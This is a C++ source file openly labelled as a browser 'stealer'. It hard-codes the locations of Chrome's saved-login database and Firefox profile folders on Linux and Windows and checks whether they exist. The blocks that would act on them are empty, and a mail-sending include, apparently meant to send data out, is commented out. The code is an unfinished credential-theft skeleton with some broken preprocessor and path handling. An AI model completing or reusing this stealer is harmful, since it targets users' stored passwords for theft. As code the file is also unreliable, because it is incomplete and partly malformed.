//============================================================================
// Name        : stealer.cpp
// Author      : Hleb Hatouka
// Description : stealer in C++
//============================================================================
//#include "mailsender.h"
#include <exception>
#include <filesystem>
#include <iostream>

namespace fs = std::filesystem;

int main()
{
    try
    {
#ifdef __linux__
        std::string chrome_db_path = "~/.config/google-chrome/Default";
        std::string firefox_db_path = "~/.mozilla/firefox/<profilename>";
#else _WIN32
        std::string chrome_db_path = "C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
        std::string firefox_db_path = "C:\\Users\\Admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\";
#endif

        if( fs::exists(chrome_db_path))
        {
            
        }
        if( fs::exists(firefox_db_path))
        {
            
        }
    }
    catch(std::exception &){}

    return 0;
}
